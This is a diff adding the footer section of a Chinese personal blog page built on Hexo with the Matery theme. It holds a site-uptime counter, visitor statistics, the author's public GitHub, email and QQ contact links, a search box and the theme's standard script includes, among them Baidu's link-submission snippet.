+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">57.5k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2020";
+                    var startMonth = "3";
+                    var startDate = "26";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingying177" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1770824244@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1770824244" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1770824244" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+	<script src="https://cdn.jsdelivr.net/gh/Yafine/cdn@3.1.4/source/js/click_show_text.js" type="module"></script>
+    
+
+</body>
+
+</html>
